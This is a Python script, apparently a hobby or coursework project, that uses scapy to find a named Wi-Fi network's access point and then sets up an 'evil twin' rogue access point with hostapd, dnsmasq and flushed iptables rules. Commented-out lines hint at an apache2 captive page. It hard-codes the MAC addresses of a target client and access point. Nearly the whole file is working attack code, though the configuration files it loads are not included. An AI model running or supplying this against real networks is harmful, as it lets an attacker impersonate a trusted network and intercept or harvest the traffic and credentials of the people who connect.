import os
import sys
import time

from scapy.layers.dot11 import Dot11Beacon, Dot11Elt, Dot11, RadioTap
from scapy.layers.eap import EAPOL
from scapy.layers.l2 import Ether
from scapy.packet import Raw
from scapy.sendrecv import sniff

iface_client = 'wlp2s0'
iface_ap = 'wlxc4e9841e1a74'
client_mac = 'c4:9a:02:57:30:23'
ap_mac = 'd4:35:1d:6c:e2:34'
ap_ssid = 'Avrahami'
MAX_TIMEOUT = 60
ap_beacon = None


def print_green(string: str):
    print(f'\033[92m{string}\033[00m')


def print_red(string: str):
    print(f'\033[31m{string}\033[00m')


def print_blue(string: str):
    print(f'\033[34m{string}\033[00m')


def set_interface():
    def stop_attack():
        os.system("service hostapd stop")
        os.system("service apache2 stop")
        os.system("service dnsmasq stop")
        os.system("killall dnsmasq")
        os.system("killall hostapd")
        os.system("systemctl start NetworkManager")
        
    def set_monitor_mode(iface: str):
        print_blue(f'starting monitor mode for {iface}')
        try:
            os.system(f'iwconfig {iface} mode monitor')
        except Exception:
            print_red('could not start monitor mode')
            sys.exit()
        print_green(f'interface {iface} is on monitor mode')

    stop_attack()
    os.system(f"sudo ip link set {iface_ap} down")
    set_monitor_mode(iface_ap)
    os.system(f"sudo ip link set {iface_ap} up")


def get_ap_mac():
    print(f'trying to find {ap_ssid} MAC address')
    global ap_mac

    def check_ap(pkt):
        global ap_mac, ap_beacon
        if pkt.haslayer(Dot11Beacon) and pkt[Dot11Elt].info.decode():
            ap_mac = pkt[Dot11].addr2
            ap_beacon = pkt
            return True

    sniff(iface=iface_ap, store=0, stop_filter=check_ap, timeout=MAX_TIMEOUT)

    if ap_mac is None:
        # If AP MAC address could not be found
        print_red('could not retrieve AP MAC address')
        sys.exit()

    print_green(f'MAC address found {ap_mac}')


# def modify_conf_files():
#     with open('hostapd.conf', 'w') as w_file:
#         replacement = f'interface={interface}\n' \
#                       f'ssid={target_network_ssid}\n'
#         with open('hostapd_init', 'r') as r_file:
#             replacement += ''.join(r_file.readlines())
#         w_file.write(replacement)
#     with open('dnsmasq.conf', 'w') as w_file:
#         replacement = f'interface={interface}\n'
#         with open('dnsmasq_init', 'r') as r_file:
#             replacement += ''.join(r_file.readlines())
#         w_file.write(replacement)


def create_evil_twin():
    print('stopping network manager...')
    os.system('systemctl stop NetworkManager')
    print('killing unnecessary processes...')
    os.system('airmon-ng check kill')

    os.system(f'ifconfig {iface_ap} 10.0.0.1 netmask 255.255.255.0')
    os.system('route add default gw 10.0.0.1')

    os.system('iptables --flush')
    os.system('iptables --table nat --flush')
    os.system('iptables --delete-chain')
    os.system('iptables --table nat --delete-chain')
    os.system('iptables -P FORWARD ACCEPT')
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

    print('activate dnsmasq...')
    os.system('dnsmasq -C ./dnsmasq.conf')

    print('activate hostapd...')
    os.system('hostapd ./hostapd.conf -B')
    # print("activate apache2")
    # os.system('service apache2 start')


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    set_interface()

    get_ap_mac()

    # modify_conf_files()

    create_evil_twin()
